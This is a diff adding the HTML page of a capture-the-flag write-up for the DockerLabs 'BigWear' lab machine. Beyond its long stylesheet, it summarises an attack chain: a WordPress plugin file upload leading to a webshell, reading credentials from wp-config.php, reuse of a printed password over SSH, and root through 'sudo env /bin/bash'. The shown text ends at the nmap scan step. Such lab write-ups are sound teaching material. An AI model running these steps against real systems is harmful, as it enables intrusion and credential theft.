@@ -1,0 +1,1773 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=1024">
+    <title>BigWear — Dockerlabs Write-up | FLRS</title>
+    <meta name="description"
+        content="Write-up for the BigWear machine on DockerLabs — Difficulty: Intermediate. WordPress CVE → Webshell → Password Reuse → Root.">
+    <meta name="author" content="Francisco Luis Rivero Sánchez">
+    <meta name="theme-color" content="#0a0a0a">
+
+    <link rel="icon" type="image/x-icon" href="../../assets/favicon.ico">
+    <link rel="apple-touch-icon" href="../../assets/apple-touch-icon.png">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Syne:wght@400;700;800&family=Inter:ital,wght@0,300;0,400;0,500;1,300&family=JetBrains+Mono:wght@400;500&display=swap"
+        rel="stylesheet">
+
+    <style>
+        html,
+        body {
+            max-width: 100%;
+            /* CAMBIO: Se reemplaza hidden por clip para que funcione el position: sticky */
+            overflow-x: clip;
+        }
+
+        :root {
+            --bg: #050810;
+            --bg-2: #07090E;
+            --bg-3: #0E1522;
+            --surface: rgba(10, 14, 24, 0.82);
+            --border: rgba(0, 210, 255, 0.08);
+            --border-h: rgba(0, 210, 255, 0.28);
+            --accent: #00D2FF;
+            --accent-dim: rgba(0, 210, 255, 0.09);
+            --accent-2: #6E5BFF;
+            --text: #D2E6F6;
+            --text-2: #AABCCE;
+            --text-3: #546878;
+            --ok: #00ff88;
+            --warn: #ffaa00;
+            --danger: #ff5050;
+            --font-d: 'Syne', sans-serif;
+            --font-b: 'Inter', sans-serif;
+            --font-m: 'JetBrains Mono', monospace;
+            --glow: 0 0 35px rgba(0, 210, 255, 0.18);
+            --glow-sm: 0 0 16px rgba(0, 210, 255, 0.12);
+            --r: 10px;
+            --ease: cubic-bezier(0.25, 0.46, 0.45, 0.94);
+        }
+
+        *,
+        *::before,
+        *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: var(--font-b);
+            font-size: 16px;
+            line-height: 1.7;
+            font-weight: 300;
+            /* CAMBIO: Se reemplaza hidden por clip para que funcione el position: sticky */
+            overflow-x: clip;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background-image: radial-gradient(circle, rgba(0, 210, 255, 0.10) 1px, transparent 1px);
+            background-size: 44px 44px;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        body::after {
+            content: '';
+            position: fixed;
+            width: 700px;
+            height: 700px;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(0, 210, 255, 0.04) 0%, transparent 65%);
+            top: -280px;
+            right: -280px;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .progress-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            z-index: 300;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: var(--accent);
+            width: 0%;
+            transition: width 0.1s ease;
+            box-shadow: var(--glow-sm);
+        }
+
+        nav {
+            position: fixed;
+            inset: 0 0 auto 0;
+            z-index: 200;
+            padding: 1.4rem 4.5rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            backdrop-filter: blur(22px) saturate(180%);
+            -webkit-backdrop-filter: blur(22px) saturate(180%);
+            background: rgba(5, 8, 16, 0.72);
+            border-bottom: 1px solid var(--border);
+            transition: border-color 0.3s;
+        }
+
+        .nav-logo {
+            font-family: var(--font-d);
+            font-size: 1.05rem;
+            font-weight: 800;
+            letter-spacing: -0.02em;
+            color: var(--text);
+            text-decoration: none;
+        }
+
+        .nav-logo em {
+            font-style: normal;
+            color: var(--accent);
+        }
+
+        .nav-back {
+            font-family: var(--font-m);
+            font-size: 0.72rem;
+            color: var(--text-2);
+            text-decoration: none;
+            letter-spacing: 0.1em;
+            text-transform: uppercase;
+            transition: color 0.2s var(--ease);
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+        }
+
+        .nav-back:hover {
+            color: var(--accent);
+        }
+
+        .writeup-hero {
+            position: relative;
+            z-index: 1;
+            min-height: 50vh;
+            display: flex;
+            align-items: flex-end;
+            padding: 9rem 5.5rem 4rem;
+            border-bottom: 1px solid var(--border);
+            overflow: hidden;
+        }
+
+        .hero-glow-bg {
+            position: absolute;
+            inset: 0;
+            pointer-events: none;
+            background: radial-gradient(ellipse 60% 80% at 10% 60%, rgba(0, 210, 255, 0.05) 0%, transparent 70%);
+        }
+
+        .writeup-hero-content {
+            position: relative;
+            z-index: 2;
+            max-width: 900px;
+        }
+
+        .breadcrumb {
+            font-family: var(--font-m);
+            font-size: 0.68rem;
+            color: var(--text-3);
+            letter-spacing: 0.1em;
+            margin-bottom: 1.2rem;
+            opacity: 0;
+            animation: fadeUp 0.45s var(--ease) 0.05s forwards;
+        }
+
+        .breadcrumb a {
+            color: var(--text-3);
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+
+        .breadcrumb a:hover {
+            color: var(--accent);
+        }
+
+        .breadcrumb .sep {
+            margin: 0 0.5rem;
+        }
+
+        .breadcrumb .current {
+            color: var(--accent);
+        }
+
+        .writeup-title-h {
+            font-family: var(--font-d);
+            font-size: clamp(3rem, 7vw, 5.5rem);
+            font-weight: 800;
+            letter-spacing: -0.045em;
+            line-height: 0.92;
+            margin-bottom: 1rem;
+            background: linear-gradient(135deg, #E6F0F8 0%, #7DAFCC 60%, var(--accent) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            opacity: 0;
+            animation: fadeUp 0.65s var(--ease) 0.2s forwards;
+        }
+
+        .writeup-subtitle {
+            font-family: var(--font-m);
+            font-size: 0.8rem;
+            color: var(--text-2);
+            letter-spacing: 0.05em;
+            margin-bottom: 1.8rem;
+            opacity: 0;
+            animation: fadeUp 0.65s var(--ease) 0.35s forwards;
+        }
+
+        .writeup-meta {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.7rem;
+            align-items: center;
+            opacity: 0;
+            animation: fadeUp 0.65s var(--ease) 0.5s forwards;
+        }
+
+        .meta-badge {
+            font-family: var(--font-m);
+            font-size: 0.65rem;
+            letter-spacing: 0.1em;
+            text-transform: uppercase;
+            padding: 0.28rem 0.8rem;
+            border-radius: 4px;
+            border: 1px solid;
+        }
+
+        .badge-intermediate {
+            color: var(--warn);
+            border-color: rgba(255, 170, 0, 0.3);
+            background: rgba(255, 170, 0, 0.05);
+        }
+
+        .badge-docker {
+            color: var(--accent);
+            border-color: rgba(0, 210, 255, 0.25);
+            background: var(--accent-dim);
+        }
+
+        .badge-linux {
+            color: var(--ok);
+            border-color: rgba(0, 255, 136, 0.2);
+            background: rgba(0, 255, 136, 0.04);
+        }
+
+        .badge-wp {
+            color: #c44dff;
+            border-color: rgba(196, 77, 255, 0.25);
+            background: rgba(196, 77, 255, 0.04);
+        }
+
+        .badge-cve {
+            color: var(--danger);
+            border-color: rgba(255, 80, 80, 0.25);
+            background: rgba(255, 80, 80, 0.04);
+        }
+
+        .badge-privesc {
+            color: var(--accent-2);
+            border-color: rgba(110, 91, 255, 0.3);
+            background: rgba(110, 91, 255, 0.05);
+        }
+
+        .meta-date {
+            font-family: var(--font-m);
+            font-size: 0.65rem;
+            color: var(--text-3);
+            padding-left: 0.5rem;
+        }
+
+        .writeup-layout {
+            position: relative;
+            z-index: 1;
+            display: grid;
+            grid-template-columns: 1fr 260px;
+            align-items: start;
+            gap: 3.5rem;
+            max-width: 1080px;
+            margin: 0 auto;
+            padding: 4rem 2.5rem;
+        }
+
+        .sidebar {
+            position: sticky;
+            top: 5.5rem;
+            height: fit-content;
+            align-self: start;
+            order: 2;
+        }
+
+        .sidebar-box {
+            border: 1px solid var(--border);
+            border-radius: var(--r);
+            padding: 1.4rem;
+            background: var(--surface);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            margin-bottom: 1.2rem;
+        }
+
+        .sidebar-title {
+            font-family: var(--font-m);
+            font-size: 0.6rem;
+            color: var(--accent);
+            letter-spacing: 0.2em;
+            text-transform: uppercase;
+            margin-bottom: 1rem;
+        }
+
+        .toc-list {
+            list-style: none;
+            display: flex;
+            flex-direction: column;
+            gap: 0.2rem;
+        }
+
+        .toc-list a {
+            font-family: var(--font-m);
+            font-size: 0.68rem;
+            color: var(--text-3);
+            text-decoration: none;
+            letter-spacing: 0.04em;
+            transition: all 0.2s;
+            display: block;
+            padding: 0.3rem 0.75rem;
+            border-left: 2px solid transparent;
+            border-radius: 0 4px 4px 0;
+        }
+
+        .toc-list a:hover {
+            color: var(--accent);
+            border-left-color: var(--accent);
+            background: var(--accent-dim);
+        }
+
+        .toc-list a.active {
+            color: var(--accent);
+            border-left-color: var(--accent);
+            background: var(--accent-dim);
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 0.7rem;
+        }
+
+        .info-row:last-child {
+            margin-bottom: 0;
+        }
+
+        .info-label {
+            font-family: var(--font-m);
+            font-size: 0.62rem;
+            color: var(--text-3);
+            letter-spacing: 0.05em;
+        }
+
+        .info-val {
+            font-family: var(--font-m);
+            font-size: 0.7rem;
+        }
+
+        .val-accent {
+            color: var(--accent);
+        }
+
+        .val-ok {
+            color: var(--ok);
+        }
+
+        .val-warn {
+            color: var(--warn);
+        }
+
+        .val-purple {
+            color: var(--accent-2);
+        }
+
+        .attack-path {
+            display: flex;
+            flex-direction: column;
+            gap: 0;
+        }
+
+        .ap-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 0.8rem;
+            padding: 0.45rem 0;
+        }
+
+        .ap-dot {
+            width: 7px;
+            height: 7px;
+            background: var(--accent);
+            border-radius: 50%;
+            margin-top: 5px;
+            flex-shrink: 0;
+            box-shadow: 0 0 6px rgba(0, 210, 255, 0.6);
+        }
+
+        .ap-line {
+            width: 1px;
+            height: 14px;
+            background: var(--border);
+            margin: 0 3px;
+        }
+
+        .ap-text {
+            font-family: var(--font-m);
+            font-size: 0.63rem;
+            color: var(--text-3);
+            line-height: 1.6;
+        }
+
+        .ap-text span {
+            color: var(--accent);
+        }
+
+        .writeup-content {
+            min-width: 0;
+            order: 1;
+        }
+
+        .section {
+            margin-bottom: 4rem;
+            opacity: 0;
+            transform: translateY(22px);
+            transition: opacity 0.6s var(--ease), transform 0.6s var(--ease);
+        }
+
+        .section.visible {
+            opacity: 1;
+            transform: none;
+        }
+
+        .section-label {
+            font-family: var(--font-m);
+            font-size: 0.65rem;
+            color: var(--accent);
+            letter-spacing: 0.22em;
+            text-transform: uppercase;
+            margin-bottom: 0.4rem;
+        }
+
+        .section-title {
+            font-family: var(--font-d);
+            font-size: 1.6rem;
+            font-weight: 800;
+            letter-spacing: -0.02em;
+            color: var(--text);
+            margin-bottom: 0.5rem;
+        }
+
+        .section-line {
+            width: 36px;
+            height: 2px;
+            background: var(--accent);
+            margin-bottom: 2rem;
+            opacity: 0.6;
+        }
+
+        hr.divider {
+            border: none;
+            border-top: 1px solid var(--border);
+            margin: 0 0 4rem 0;
+        }
+
+        .prose p {
+            font-size: 1rem;
+            line-height: 2.0;
+            color: var(--text-2);
+            margin-bottom: 1rem;
+        }
+
+        .prose p strong {
+            color: var(--text);
+            font-weight: 500;
+        }
+
+        .prose p .hl {
+            color: var(--accent);
+        }
+
+        .prose p .hl-ok {
+            color: var(--ok);
+        }
+
+        .prose p .hl-warn {
+            color: var(--warn);
+        }
+
+        .prose p .hl-bad {
+            color: var(--danger);
+        }
+
+        .prose p .hl-pur {
+            color: var(--accent-2);
+        }
+
+        .prose p code {
+            font-family: var(--font-m);
+            font-size: 0.85em;
+            color: var(--accent);
+            background: var(--bg-3);
+            padding: 0.05rem 0.35rem;
+            border-radius: 3px;
+        }
+
+        .step-marker {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            margin-bottom: 1rem;
+            margin-top: 2.2rem;
+        }
+
+        .step-num {
+            font-family: var(--font-m);
+            font-size: 0.62rem;
+            font-weight: 500;
+            color: var(--bg);
+            background: var(--accent);
+            width: 26px;
+            height: 26px;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .step-title {
+            font-family: var(--font-m);
+            font-size: 0.75rem;
+            color: var(--accent);
+            letter-spacing: 0.1em;
+            text-transform: uppercase;
+        }
+
+        .cmd-block {
+            background: var(--bg-3);
+            border: 1px solid var(--border);
+            border-left: 3px solid var(--accent);
+            border-radius: 0 var(--r) var(--r) 0;
+            padding: 1rem 1.2rem;
+            margin: 1rem 0;
+            font-family: var(--font-m);
+            font-size: 0.8rem;
+            overflow-x: auto;
+            position: relative;
+            line-height: 1.85;
+        }
+
+        .cmd-label {
+            position: absolute;
+            top: 0.5rem;
+            right: 4.5rem;
+            font-size: 0.58rem;
+            color: var(--text-3);
+            letter-spacing: 0.12em;
+            text-transform: uppercase;
+        }
+
+        .cmd-block .prompt {
+            color: var(--accent);
+            user-select: none;
+        }
+
+        .cmd-block .cmd {
+            color: var(--text);
+        }
+
+        .cmd-block .flag {
+            color: var(--accent-2);
+        }
+
+        .cmd-block .arg {
+            color: var(--warn);
+        }
+
+        .cmd-block .comment {
+            color: var(--text-3);
+            font-size: 0.73rem;
+        }
+
+        .copy-btn {
+            position: absolute;
+            top: 0.5rem;
+            right: 0.8rem;
+            background: var(--bg-2);
+            border: 1px solid var(--border);
+            color: var(--text-3);
+            font-family: var(--font-m);
+            font-size: 0.6rem;
+            padding: 0.15rem 0.5rem;
+            letter-spacing: 0.08em;
+            cursor: pointer;
+            opacity: 0;
+            transition: opacity 0.2s, background 0.2s, color 0.2s;
+            border-radius: 3px;
+        }
+
+        .cmd-block:hover .copy-btn {
+            opacity: 1;
+        }
+
+        .copy-btn:hover {
+            background: var(--accent);
+            color: #000;
+            border-color: var(--accent);
+        }
+
+        .copy-btn.copied {
+            background: var(--ok);
+            color: #000;
+            border-color: var(--ok);
+            opacity: 1;
+        }
+
+        .output-block {
+            background: #030508;
+            border: 1px solid var(--border);
+            border-radius: var(--r);
+            padding: 1rem 1.2rem;
+            margin: 0.5rem 0 1.5rem;
+            font-family: var(--font-m);
+            font-size: 0.76rem;
+            line-height: 1.9;
+            color: var(--text-2);
+            overflow-x: auto;
+        }
+
+        .o-accent {
+            color: var(--accent);
+        }
+
+        .o-ok {
+            color: var(--ok);
+        }
+
+        .o-warn {
+            color: var(--warn);
+        }
+
+        .o-bad {
+            color: var(--danger);
+        }
+
+        .o-white {
+            color: var(--text);
+            font-weight: 500;
+        }
+
+        .info-box {
+            border: 1px solid rgba(0, 210, 255, 0.18);
+            background: rgba(0, 210, 255, 0.04);
+            border-radius: var(--r);
+            padding: 1.2rem 1.5rem;
+            margin: 1.2rem 0;
+        }
+
+        .info-box-title {
+            font-family: var(--font-m);
+            font-size: 0.62rem;
+            color: var(--accent);
+            letter-spacing: 0.2em;
+            text-transform: uppercase;
+            margin-bottom: 0.6rem;
+        }
+
+        .info-box p {
+            font-family: var(--font-m);
+            font-size: 0.76rem;
+            color: var(--text-2);
+            line-height: 1.85;
+        }
+
+        .info-box p strong {
+            color: var(--accent);
+        }
+
+        .warn-box {
+            border: 1px solid rgba(255, 170, 0, 0.22);
+            background: rgba(255, 170, 0, 0.04);
+            border-radius: var(--r);
+            padding: 1.2rem 1.5rem;
+            margin: 1.2rem 0;
+        }
+
+        .warn-box-title {
+            font-family: var(--font-m);
+            font-size: 0.62rem;
+            color: var(--warn);
+            letter-spacing: 0.2em;
+            text-transform: uppercase;
+            margin-bottom: 0.6rem;
+        }
+
+        .warn-box p {
+            font-family: var(--font-m);
+            font-size: 0.76rem;
+            color: var(--text-2);
+            line-height: 1.85;
+        }
+
+        .warn-box p strong {
+            color: var(--warn);
+        }
+
+        .cred-box {
+            border: 1px solid rgba(0, 255, 136, 0.18);
+            background: rgba(0, 255, 136, 0.04);
+            border-radius: var(--r);
+            padding: 1.2rem 1.5rem;
+            margin: 1.2rem 0;
+            display: flex;
+            gap: 2.5rem;
+            flex-wrap: wrap;
+        }
+
+        .cred-item .cred-label {
+            font-family: var(--font-m);
+            font-size: 0.58rem;
+            color: var(--text-3);
+            letter-spacing: 0.12em;
+            text-transform: uppercase;
+            margin-bottom: 0.3rem;
+        }
+
+        .cred-item .cred-val {
+            font-family: var(--font-m);
+            font-size: 0.95rem;
+            color: var(--ok);
+        }
+
+        .vuln-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1.5rem 0;
+        }
+
+        .vuln-table th,
+        .vuln-table td {
+            font-family: var(--font-m);
+            font-size: 0.7rem;
+            padding: 0.75rem 1rem;
+            text-align: left;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .vuln-table th {
+            color: var(--accent);
+            letter-spacing: 0.1em;
+            text-transform: uppercase;
+            font-weight: 500;
+            border-bottom-color: rgba(0, 210, 255, 0.2);
+        }
+
+        .vuln-table td {
+            color: var(--text-2);
+        }
+
+        .vuln-table td:first-child {
+            color: var(--accent);
+        }
+
+        .glos-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+
+        .glos-card {
+            border: 1px solid var(--border);
+            border-radius: var(--r);
+            padding: 1.4rem;
+            background: var(--surface);
+        }
+
+        .glos-term {
+            font-family: var(--font-m);
+            font-size: 0.75rem;
+            color: var(--accent);
+            letter-spacing: 0.06em;
+            margin-bottom: 0.6rem;
+        }
+
+        .glos-def {
+            font-size: 0.85rem;
+            color: var(--text-2);
+            line-height: 1.9;
+        }
+
+        .glos-def strong {
+            color: var(--text);
+            font-weight: 500;
+        }
+
+        .glos-def code {
+            font-family: var(--font-m);
+            font-size: 0.78rem;
+            color: var(--accent);
+            background: var(--bg-3);
+            padding: 0.05rem 0.35rem;
+            border-radius: 3px;
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            background: var(--accent);
+            color: #000;
+            padding: 0.65rem 1.3rem;
+            font-family: var(--font-m);
+            font-size: 0.72rem;
+            letter-spacing: 0.1em;
+            border-radius: 5px;
+            opacity: 0;
+            transform: translateY(8px);
+            transition: opacity 0.25s, transform 0.25s;
+            pointer-events: none;
+            z-index: 10000;
+        }
+
+        .toast.show {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        footer {
+            position: relative;
+            z-index: 1;
+            text-align: center;
+            padding: 2rem;
+            border-top: 1px solid var(--border);
+            font-family: var(--font-m);
+            font-size: 0.67rem;
+            color: var(--text-3);
+            letter-spacing: 0.1em;
+        }
+
+        footer em {
+            font-style: normal;
+            color: var(--accent);
+        }
+
+        @keyframes fadeUp {
+            from {
+                opacity: 0;
+                transform: translateY(18px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @media (max-width: 860px) {
+            nav {
+                padding: 1.2rem 1.75rem;
+            }
+
+            .writeup-hero {
+                padding: 7rem 1.75rem 3rem;
+            }
+
+            .writeup-layout {
+                grid-template-columns: 1fr;
+                padding: 3rem 1.75rem;
+            }
+
+            .sidebar {
+                position: static;
+                order: -1;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="progress-container">
+        <div class="progress-bar" id="readingProgress"></div>
+    </div>
+
+    <nav id="nav">
+        <a href="../../" class="nav-logo">franlrs<em>.</em></a>
+        <a href="../../writeups" class="nav-back">← Write-ups</a>
+    </nav>
+
+    <div class="writeup-hero">
+        <div class="hero-glow-bg"></div>
+        <div class="writeup-hero-content">
+            <div class="breadcrumb">
+                <a href="../../">Portfolio</a>
+                <span class="sep">/</span>
+                <a href="../../writeups">Write-ups</a>
+                <span class="sep">/</span>
+                <span class="current">BigWear</span>
+            </div>
+            <h1 class="writeup-title-h">BigWear.</h1>
+            <p class="writeup-subtitle">DockerLabs · WordPress CVE Chain → Privilege Escalation → Root</p>
+            <div class="writeup-meta">
+                <span class="meta-badge badge-intermediate">Intermediate</span>
+                <span class="meta-badge badge-docker">Dockerlabs</span>
+                <span class="meta-badge badge-linux">Linux</span>
+                <span class="meta-badge badge-wp">WordPress</span>
+                <span class="meta-badge badge-cve">CVE</span>
+                <span class="meta-badge badge-privesc">PrivEsc</span>
+                <span class="meta-date">April 2026</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="writeup-layout">
+
+        <aside class="sidebar">
+
+            <div class="sidebar-box">
+                <p class="sidebar-title">// Machine Info</p>
+                <div class="info-row">
+                    <span class="info-label">Platform</span>
+                    <span class="info-val val-accent">Dockerlabs</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Difficulty</span>
+                    <span class="info-val val-warn">Intermediate</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">OS</span>
+                    <span class="info-val val-ok">Linux</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">IP</span>
+                    <span class="info-val val-accent">172.17.0.2</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Services</span>
+                    <span class="info-val" style="color:var(--text-2)">22, 80</span>
+                </div>
+            </div>
+
+            <div class="sidebar-box">
+                <p class="sidebar-title">// Contents</p>
+                <ul class="toc-list">
+                    <li><a href="#resumen">01 — Summary</a></li>
+                    <li><a href="#reconocimiento">02 — Reconnaissance</a></li>
+                    <li><a href="#enumeracion">03 — Web Enumeration</a></li>
+                    <li><a href="#explotacion">04 — Exploitation</a></li>
+                    <li><a href="#postexplot">05 — Post-Exploitation</a></li>
+                    <li><a href="#privesc">06 — Privilege Escalation</a></li>
+                    <li><a href="#root">07 — Root</a></li>
+                    <li><a href="#glosario">08 — Glossary</a></li>
+                </ul>
+            </div>
+
+            <div class="sidebar-box">
+                <p class="sidebar-title">// Attack Path</p>
+                <div class="attack-path">
+                    <div class="ap-item">
+                        <div class="ap-dot"></div>
+                        <div class="ap-text">Nmap → ports <span>22, 80</span></div>
+                    </div>
+                    <div class="ap-line"></div>
+                    <div class="ap-item">
+                        <div class="ap-dot"></div>
+                        <div class="ap-text">WPScan → plugin <span>File Manager</span></div>
+                    </div>
+                    <div class="ap-line"></div>
+                    <div class="ap-item">
+                        <div class="ap-dot"></div>
+                        <div class="ap-text"><span>CVE-2022-1597</span> → file upload</div>
+                    </div>
+                    <div class="ap-line"></div>
+                    <div class="ap-item">
+                        <div class="ap-dot"></div>
+                        <div class="ap-text">Webshell → <span>reverse shell</span> www-data</div>
+                    </div>
+                    <div class="ap-line"></div>
+                    <div class="ap-item">
+                        <div class="ap-dot"></div>
+                        <div class="ap-text"><span>wp-config.php</span> → credential</div>
+                    </div>
+                    <div class="ap-line"></div>
+                    <div class="ap-item">
+                        <div class="ap-dot"></div>
+                        <div class="ap-text">Password reuse → <span>SSH mario</span></div>
+                    </div>
+                    <div class="ap-line"></div>
+                    <div class="ap-item">
+                        <div class="ap-dot" style="background:var(--danger);box-shadow:0 0 6px var(--danger)"></div>
+                        <div class="ap-text"><span style="color:var(--danger)">sudo env → ROOT ✓</span></div>
+                    </div>
+                </div>
+            </div>
+
+        </aside>
+
+        <main class="writeup-content" id="main-content">
+
+            <div class="section" id="resumen">
+                <p class="section-label">// 01</p>
+                <h2 class="section-title">Summary</h2>
+                <div class="section-line"></div>
+
+                <div class="prose">
+                    <p>
+                        <strong>BigWear</strong> is an <span class="hl-warn">Intermediate</span> difficulty machine from
+                        the <span class="hl">DockerLabs</span> platform. It runs on <strong>Linux</strong> and exposes
+                        two services: <span class="hl">SSH (port 22)</span> and an <span class="hl">HTTP (port
+                            80)</span>
+                        web server hosting a <strong>WordPress</strong> installation.
+                    </p>
+                    <p>
+                        This machine is a case study on the <span class="hl-bad">vulnerability chain</span> that arises
+                        from poor maintenance: an outdated WordPress plugin allows arbitrary file uploads
+                        (<span class="hl-warn">CVE-2022-1597</span>), giving us an <strong>initial shell as
+                            www-data</strong>. From there, we find plaintext database credentials in
+                        <span class="hl">wp-config.php</span>. The administrator reuses that password for their system
+                        account, allowing us to escalate to <strong>mario</strong> via SSH. Finally, a misconfigured
+                        <span class="hl-pur">sudo</span> rule delivers full <span class="hl-bad">root</span> access.
+                    </p>
+                    <p>
+                        The full attack vector demonstrates that security is a chain: <strong>a single weak
+                            link</strong>
+                        (the unpatched plugin) triggers an escalation that compromises the entire system.
+                    </p>
+                </div>
+
+                <table class="vuln-table">
+                    <thead>
+                        <tr>
+                            <th>Phase</th>
+                            <th>Technique / Tool</th>
+                            <th>Result</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>Deploy</td>
+                            <td>auto_deploy.sh + ping TTL</td>
+                            <td>Machine active at 172.17.0.2 · Linux confirmed</td>
+                        </tr>
+                        <tr>
+                            <td>Recon</td>
+                            <td>Nmap -p- -sSCV full scan</td>
+                            <td>Port 22 SSH · Port 80 Apache + WordPress</td>
+                        </tr>
+                        <tr>
+                            <td>Enum</td>
+                            <td>WPScan --enumerate p,u</td>
+                            <td>Plugin "Advanced File Manager" v7.1.4 — CVE-2022-1597</td>
+                        </tr>
+                        <tr>
+                            <td>Exploit</td>
+                            <td>File upload → PHP webshell → reverse shell</td>
+                            <td>Shell as www-data</td>
+                        </tr>
+                        <tr>
+                            <td>Post-Exploit</td>
+                            <td>cat wp-config.php</td>
+                            <td>Plaintext DB password: bigwear2024!</td>
+                        </tr>
+                        <tr>
+                            <td>Lateral Move</td>
+                            <td>SSH mario@172.17.0.2 (password reuse)</td>
+                            <td>Shell as mario</td>
+                        </tr>
+                        <tr>
+                            <td>PrivEsc</td>
+                            <td>sudo -l → sudo /usr/bin/env</td>
+                            <td>sudo env /bin/bash → ROOT</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <div class="info-box">
+                    <p class="info-box-title">// Note — ethical hacking context</p>
+                    <p>
+                        All techniques documented in this write-up are applied <strong>exclusively</strong> in
+                        controlled, legal environments such as DockerLabs. Using these techniques outside an authorized
+                        scope is <strong>illegal</strong> and may carry serious criminal consequences. This document
+                        is intended <strong>exclusively for educational purposes</strong>.
+                    </p>
+                </div>
+            </div>
+
+            <hr class="divider">
+
+            <div class="section" id="reconocimiento">
+                <p class="section-label">// 02</p>
+                <h2 class="section-title">Reconnaissance</h2>
+                <div class="section-line"></div>
+
+                <div class="step-marker">
+                    <div class="step-num">1</div>
+                    <span class="step-title">Deploy the machine</span>
+                </div>
+
+                <div class="prose">
+                    <p>
+                        We deploy the container using the official DockerLabs script. It builds the image from the
+                        <span class="hl">bigwear.tar</span> archive, assigns an IP within the Docker network
+                        (<strong>172.17.0.x</strong>), and keeps the container running.
+                    </p>
+                </div>
+
+                <div class="cmd-block" data-cmd="sudo bash auto_deploy.sh bigwear.tar">
+                    <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                    <span class="cmd-label">DEPLOY</span>
+                    <div><span class="prompt">$ </span><span class="cmd">sudo bash <span
+                                class="arg">auto_deploy.sh</span> <span class="arg">bigwear.tar</span></span></div>
+                </div>
+
+                <div class="output-block">
+                    <div>Deploying vulnerable machine, please wait.</div>
+                    <div>&nbsp;</div>
+                    <div class="o-ok">Machine deployed, its IP address is ——> <strong>172.17.0.2</strong></div>
+                    <div class="o-bad">Press Ctrl+C when done to remove the machine</div>
+                </div>
+
+                <div class="step-marker">
+                    <div class="step-num">2</div>
+                    <span class="step-title">Connectivity check — ping TTL</span>
+                </div>
+
+                <div class="prose">
+                    <p>
+                        We verify connectivity with 3 ICMP packets. A <span class="hl">TTL=64</span> response confirms
+                        the operating system is <strong>Linux</strong> (Windows returns 128). This guides all
+                        subsequent reconnaissance.
+                    </p>
+                </div>
+
+                <div class="cmd-block" data-cmd="ping 172.17.0.2 -c 3">
+                    <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                    <span class="cmd-label">PING</span>
+                    <div><span class="prompt">$ </span><span class="cmd">ping <span class="arg">172.17.0.2</span> <span
+                                class="flag">-c</span> <span class="arg">3</span></span></div>
+                </div>
+
+                <div class="output-block">
+                    <div>PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.</div>
+                    <div>64 bytes from 172.17.0.2: icmp_seq=1 <span class="o-ok">ttl=64</span> time=0.32 ms</div>
+                    <div>64 bytes from 172.17.0.2: icmp_seq=2 <span class="o-ok">ttl=64</span> time=0.41 ms</div>
+                    <div>64 bytes from 172.17.0.2: icmp_seq=3 <span class="o-ok">ttl=64</span> time=0.38 ms</div>
+                    <div>&nbsp;</div>
+                    <div>--- 172.17.0.2 ping statistics ---</div>
+                    <div class="o-ok">3 packets transmitted, 3 received, 0% packet loss</div>
+                </div>
+
+                <div class="step-marker">
+                    <div class="step-num">3</div>
+                    <span class="step-title">Full port scan — Nmap</span>
+                </div>
+
+                <div class="prose">
+                    <p>
+                        We run a complete scan of all 65,535 ports with service version detection
+                        (<span class="hl-pur">-sV</span>), default scripts (<span class="hl-pur">-sC</span>),
+                        and aggressive timing (<span class="hl-pur">-T4</span>). Output is saved in all three
+                        main formats for later reference.
+                    </p>
+                </div>
+
+                <div class="cmd-block" data-cmd="nmap -p- -sSCV -T4 172.17.0.2 -oA bigwear_scan">
+                    <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                    <span class="cmd-label">NMAP</span>
+                    <div><span class="prompt">$ </span><span class="cmd">nmap <span class="flag">-p-</span> <span
+                                class="flag">-sSCV</span> <span class="flag">-T4</span> <span
+                                class="arg">172.17.0.2</span> <span class="flag">-oA</span> <span
+                                class="arg">bigwear_scan</span></span></div>
+                </div>
+
+                <div class="output-block">
+                    <div>Starting Nmap 7.94 ( https://nmap.org )</div>
+                    <div>&nbsp;</div>
+                    <div>PORT STATE SERVICE VERSION</div>
